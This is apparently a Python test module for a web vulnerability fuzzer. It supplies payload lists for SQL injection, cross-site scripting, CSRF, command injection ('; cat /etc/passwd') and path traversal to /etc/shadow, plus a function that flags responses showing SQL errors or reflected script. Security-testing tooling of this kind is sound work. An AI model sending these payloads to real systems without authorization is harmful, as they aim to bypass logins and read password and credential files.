"""
Temporary test hooks for payloads, vulnerability checks, and logging.

Replace imports in main.py with the real payload/verification module when ready.
"""

from __future__ import annotations

from collections.abc import Callable

from core import Payload
from fuzzer import FuzzerResponse, build_and_send_request


def _payloads_sqli() -> list[Payload]:
    return [
        Payload(value="admin' or 1=1 #", attack_type="SQL Injection", risk_level="CRITICAL"),
        Payload(value="' UNION SELECT user, password #", attack_type="SQL Injection", risk_level="CRITICAL"),
        Payload(value="1' AND 1=2 #", attack_type="SQL Injection", risk_level="MEDIUM"),
        Payload(value="admin\\' --", attack_type="SQL Injection", risk_level="LOW"),
    ]


def _payloads_xss() -> list[Payload]:
    return [
        Payload(value="<script>alert('xss')</script>", attack_type="Cross-Site Scripting", risk_level="HIGH"),
        Payload(value="<img src=x onerror=prompt(1)>", attack_type="Cross-Site Scripting", risk_level="MEDIUM"),
    ]


def _payloads_csrf() -> list[Payload]:
    return [
        Payload(value="hacked_password", attack_type="CSRF", risk_level="HIGH"),
    ]


def _payloads_misc() -> list[Payload]:
    return [
        Payload(value="normal_user_123", attack_type="Normal Request", risk_level="LOW"),
        Payload(value="; cat /etc/passwd", attack_type="Command Injection", risk_level="CRITICAL"),
        Payload(value="../../../../etc/shadow", attack_type="Local File Inclusion", risk_level="HIGH"),
    ]


# Map CLI --type values to callables that return payloads for that attack class.
ATTACK_PAYLOAD_PROVIDERS: dict[str, Callable[[], list[Payload]]] = {
    "sqli": _payloads_sqli,
    "xss": _payloads_xss,
    "csrf": _payloads_csrf,
}


def get_payloads(attack_type: str) -> list[Payload]:
    """
    Return payloads for the given attack type.
    ``all`` merges every registered attack category (plus misc samples).
    """
    if attack_type == "all":
        merged: list[Payload] = []
        for provider in ATTACK_PAYLOAD_PROVIDERS.values():
            merged.extend(provider())
        merged.extend(_payloads_misc())
        return merged

    provider = ATTACK_PAYLOAD_PROVIDERS.get(attack_type)
    return provider() if provider else []


def is_vulnerable(response: FuzzerResponse) -> bool:
    """Analyze the HTTP response and return True if the probe looks successful."""
    if response.error == "TimeoutError":
        return True

    text = (response.text or "").lower()

    if "password changed" in text:
        return True
    if "you have an error in your sql syntax" in text or "mysql_fetch_array" in text:
        return True
    if text.count("first name:") > 1:
        return True
    if "<script>alert('xss')</script>" in text:
        return True

    return False


async def verbose_request_sender(session, surface, parameter, payload):
    """Log each request, then delegate to the shared request builder."""
    payload_value = getattr(payload, "value", str(payload))
    print(f"[send] parameter={parameter!r} payload={payload_value!r}")
    return await build_and_send_request(session, surface, parameter, payload_value)
